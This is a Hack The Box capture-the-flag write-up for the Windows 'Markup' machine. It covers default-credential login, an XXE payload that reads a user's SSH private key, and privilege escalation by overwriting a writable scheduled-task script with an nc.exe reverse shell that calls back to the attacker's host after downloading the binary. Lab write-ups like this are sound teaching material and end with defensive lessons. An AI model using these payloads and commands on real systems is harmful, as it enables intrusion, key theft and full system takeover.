# Markup

| | |
|---|---|
| **Platform** | Hack The Box (Starting Point, Tier 2) |
| **OS** | Windows |
| **Difficulty** | Very Easy |
| **Techniques** | Default creds, XXE file disclosure, SSH key theft, writable scheduled-task script (SYSTEM) |

## Overview
Default credentials get into the app; an order form parses XML unsafely, giving an XXE
that reads a user's SSH private key; and a world-writable batch script that runs as
Administrator on a schedule is overwritten with a reverse shell for SYSTEM.

## Enumeration
```bash
nmap -p- --min-rate 1000 <TARGET_IP>
nmap -sC -sV -p 22,80,443 <TARGET_IP>       # OpenSSH + Apache (XAMPP)
# web login: admin:password
```

## Exploitation (XXE -> SSH)
Submit the order with an external entity in the reflected `item` field:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY test SYSTEM "file:///c:/users/daniel/.ssh/id_rsa">]>
<order><quantity>1</quantity><item>&test;</item><address>x</address></order>
```
The response leaks daniel's private key.
```bash
chmod 600 id_rsa
ssh -i id_rsa daniel@<TARGET_IP>            # user access
```

## Privilege Escalation (writable scheduled task)
```cmd
type C:\Log-Management\job.bat              # runs as admin, calls wevtutil.exe
icacls C:\Log-Management\job.bat            # BUILTIN\Users:(F) = writable by me
```
Host `nc.exe`, pull it down, overwrite the script, catch SYSTEM:
```cmd
powershell -c "Invoke-WebRequest http://<MY_IP>:8000/nc.exe -OutFile C:\Log-Management\nc.exe"
echo C:\Log-Management\nc.exe -e cmd.exe <MY_IP> 4444 > C:\Log-Management\job.bat
type C:\Log-Management\job.bat              # VERIFY the write stuck
# listener on the attack box catches NT AUTHORITY\SYSTEM when the task fires
```

## Key Takeaway
Disable external entities in the XML parser; do not ship default credentials; keep
private keys off web-facing hosts; and never let a script executed by a privileged
scheduled task be writable by normal users (grant `Users` read/execute only).

## What tripped me up
No callback at first because my overwrite had not actually stuck. The habit I took away:
always `type` a file to verify the write before waiting on a scheduled task. Also, do not
run the `echo`/overwrite in the terminal that is busy serving files, and `id` is a Linux
command (`whoami` on Windows).
